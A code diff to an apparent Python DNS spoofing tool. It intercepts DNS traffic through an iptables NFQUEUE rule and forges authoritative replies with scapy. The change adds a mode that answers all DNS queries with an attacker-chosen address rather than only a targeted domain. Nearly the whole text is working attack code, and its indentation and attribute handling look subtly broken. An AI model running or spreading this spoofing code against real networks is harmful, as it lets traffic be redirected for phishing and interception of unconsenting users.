@@ -27,8 +27,7 @@ import threading
 
 class DNSspoof(object):
 
-	def __init__(self,domain,fake):
-		self.domain = domain
+	def __init__(self,fake):
 		self.fake = fake
 		os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 
@@ -40,7 +39,15 @@ class DNSspoof(object):
 		if not pkt.haslayer(DNSQR):
 			packet.accept()
 		else:
-			if self.domain in pkt[DNS].qd.qname:
+			if self.inject != None:
+				new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+                                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
+                                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.fake))
+                                packet.set_payload(str(new_pkt))
+                                packet.accept()
+
+			elif self.domain in pkt[DNS].qd.qname:
 				new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
         	              		      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                 		      	      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
@@ -62,7 +69,9 @@ class DNSspoof(object):
 		self.q.unbind()
 		os.system('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 
-	def start(self):
+	def start(self,domain,inject):
+		self.domain = domain
+		self.inject = inject
 		t = threading.Thread(name='DNSspoof', target=self.spoof)
 		t.setDaemon(True)
 		t.start()
